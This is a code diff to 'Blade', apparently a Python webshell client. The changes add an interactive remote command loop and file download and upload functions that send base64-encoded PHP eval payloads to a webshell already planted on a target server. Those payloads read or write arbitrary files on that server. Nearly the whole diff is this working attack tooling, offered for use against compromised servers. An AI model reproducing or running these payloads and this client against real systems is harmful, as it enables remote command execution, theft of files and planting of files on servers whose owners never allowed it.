@@ -38,7 +38,8 @@ class Connector(object):
         h = httplib2.Http(timeout = 7)
         resp, content = h.request(self.url + '?' + param, "GET", headers = header)
         if resp['status'] != '200':
-            print 'HTTP status code: ' + resp['status']
+            print '+ HTTP Error'
+            print '+ Status Code: ' + resp['status']
             status = 'fail'
         return status, content
 
@@ -59,7 +60,8 @@ class Connector(object):
         h = httplib2.Http(timeout = 7)
         resp, content = h.request(self.url, "POST", param, header)
         if resp['status'] != '200':
-            print 'HTTP status code: ' + resp['status']
+            print '+ HTTP Error'
+            print '+ Status Code: ' + resp['status']
             status = 'fail'
         return status, content
 
@@ -155,21 +157,25 @@ class WebShellConnector(Connector):
                 else:
                     cmd = 'ver'
                 pwd = '.'
+                print '+ Connection Established'
+                print ''                
                 while cmd != 'exit':
                     result, newPwd = self.runCmd(cmd, pwd)
                     print result
                     pwd = newPwd
                     cmd = raw_input('$ ')
             else:
-                print 'The shell script can not work properly'
+                print '+ The shell script can not work properly'
         except KeyboardInterrupt:
             pass
         except AttributeError:
-            print 'Command can not run'
-            print 'Check if the password or server type is incorrect'    
+            print '+ Command can not run'
+            print '+ Check if the password or server type is incorrect'
+            print ''
         except Exception:
-            print 'Can not get shell'
-            print 'Check if the URL is incorrect'
+            print '+ Can not get shell'
+            print '+ Check if the URL is incorrect'
+            print ''
 
 
 
@@ -202,7 +208,10 @@ class PullConnector(FileConnector):
     def __init__(self, url, password, server, fileList):
         FileConnector.__init__(self, url, password, server, fileList)
         self.remoteFilePath = self.fileList[0]
-        self.localFilePath = self.fileList[1]
+        if len(self.fileList) == 2:
+            self.localFilePath = self.fileList[1]
+        else:
+            self.localFilePath = ''
 
     # Get a file download payload
     # param: server, password
@@ -211,7 +220,7 @@ class PullConnector(FileConnector):
         if server == 'php':
             payload = {}
             payload['c1'] = remoteFilePath
-            payload['c0'] = 'ZWNobyBmcmVhZChmb3BlbigkX1JFUVVFU1RbJ2MxJ10sJ3InKSxmaWxlc2l6ZSgkX1JFUVVFU1RbJ2MxJ10pKTs='
+            payload['c0'] = 'JGY9Zm9wZW4oJF9SRVFVRVNUWydjMSddLCdyJykgb3IgZGllKCdbU11OT0ZJTEVbRV0nKTtlY2hvIGZyZWFkKCRmLGZpbGVzaXplKCRfUkVRVUVTVFsnYzEnXSkpOw=='
             payload[password] = '@eval(base64_decode($_REQUEST["c0"]));'
             return payload
         elif server == 'asp':
@@ -220,23 +229,35 @@ class PullConnector(FileConnector):
             pass
         elif server == 'jsp':
             pass
-    
+
     # Download file
     # param: none
-    # return: none
+    # return: bool
     def downloadFile(self):
         payload = self.getPayload(self.server, self.password, self.remoteFilePath)
         status, result = Connector.postToServer(self, payload)
-        f = file(self.localFilePath, 'w')
-        f.write(result)
-        f.close()
+        if result != '[S]NOFILE[E]':
+            if self.localFilePath != '':
+                f = file(self.localFilePath, 'w')
+            else:
+                f = file(self.remoteFilePath, 'w')
+            f.write(result)
+            f.close()
+            return True
+        else:
+            return False
 
     # The callable method to launch the connector
     # param: none
     # return: none
     def launch(self):
         if FileConnector.launch(self) != 'fail':
-            self.downloadFile()
+            if self.downloadFile():
+                print '+ Downloading Successful'
+                print ''
+            else:
+                print '+ Downloading Failed'
+                print ''
 
 
 
@@ -249,13 +270,49 @@ class PushConnector(FileConnector):
     # return: none
     def __init__(self, url, password, server, fileList):
         FileConnector.__init__(self, url, password, server, fileList)
+        self.localFilePath = self.fileList[0]
+        self.remoteFilePath = self.fileList[1]
+
+    # Get a file upload payload
+    # param: server, password, remoteFilePath, fileContent
+    # return: payload
+    def getPayload(self, server, password, remoteFilePath, fileContent):
+        if self.server == 'php':
+            payload = {}
+            payload['c2'] = fileContent
+            payload['c1'] = remoteFilePath
+            payload['c0'] = 'JGY9Zm9wZW4oJF9SRVFVRVNUWydjMSddLCd3Jykgb3IgZGllKCdbU11OT0ZJTEVbRV0nKTtmd3JpdGUoJGYsJF9SRVFVRVNUWydjMiddKTtmY2xvc2UoJGYpOw=='
+            payload[password] = '@eval(base64_decode($_REQUEST["c0"]));'
+            return payload
+        elif self.server == 'asp':
+            pass
+        elif self.server == 'aspx':
+            pass
+        elif self.server == 'jsp':
+            pass
+
+    # Upload file
+    # param: none
+    # return: bool
+    def uploadFile(self):
+        f = file(self.localFilePath, 'r')
+        fileContent = f.read()
+        f.close()
+        payload = self.getPayload(self.server, self.password, self.remoteFilePath, fileContent)
+        status, result = Connector.postToServer(self, payload)
+        if result != '[S]NOFILE[E]':
+            print 'Uploading Successful'
+            print ''
+        else:
+            print 'Uploading Failed'
+            print ''
 
     # The callable method to launch the connector
     # param: none
     # return: none
     def launch(self):
         if FileConnector.launch(self) != 'fail':
-            print "Push launched!", self.fileList
+            self.uploadFile()
 
 
 
@@ -268,10 +325,14 @@ class Launcher(object):
     # return: none
     @classmethod
     def main(self):
+        print '- Blade (development version)'
+        print '------------------------------------------------------------'            
         config = self.getConfig()
         if self.configIsError(config):
+            print '+ Error: Parameters are not correct'
+            print ''            
             self.printHelp()
-            return
+            return    
         connector = self.getConnector(config)
         connector.launch()
 
@@ -280,15 +341,14 @@ class Launcher(object):
     # return: none
     @classmethod
     def printHelp(self):
-        print 'Params error!'
+        print '    -u             Specify the target URL'
+        print '    -s             Specify the type of server: php/asp/aspx/jsp'
+        print '    -p             Connection password (Command parameter name)'
         print ''
-        print 'There are some examples for using:'
-        print 'Connect a WebShell:'
-        print '    python blade.py -u http://yourhost:80 -p cmd -s php --shell'
-        print 'Download a file:'
-        print '    python blade.py -u http://yourhost:80 -p cmd -s php --pull /home/xx.txt /home/xx.txt'
-        print 'Upload a file:' 
-        print '    python blade.py -u http://yourhost:80 -p cmd -s php --push /home/xx.txt /home/xx.txt'
+        print '    --shell        Get a web based shell on the console'
+        print '    --pull+        Download file to local: --pull remote_path local_path / --pull remote_path'
+        print '    --push+        Upload a file from loacl: --push local_path remote_path'
+        print ''
 
     # Get the config Json object from args
     # param: none
@@ -336,6 +396,8 @@ class Launcher(object):
                 return False
             elif config['shell'] == False and len(config['pull']) == 2 and len(config['push']) == 0:
                 return False
+            elif config['shell'] == False and len(config['pull']) == 1 and len(config['push']) == 0:
+                return False
             elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 2:
                 return False
             elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 0:
@@ -350,9 +412,9 @@ class Launcher(object):
     def getConnector(self, config):
         if config['shell'] == True:
             connector = WebShellConnector(config['url'], config['password'], config['server'])
-        elif len(config['pull']) == 2:
+        elif len(config['pull']) > 0:
             connector = PullConnector(config['url'], config['password'], config['server'], config['pull'])
-        elif len(config['push']) == 2:
+        elif len(config['push']) > 0:
             connector = PushConnector(config['url'], config['password'], config['server'], config['push'])
         else:
             connector = Connector(config['url'], config['password'], config['server'])
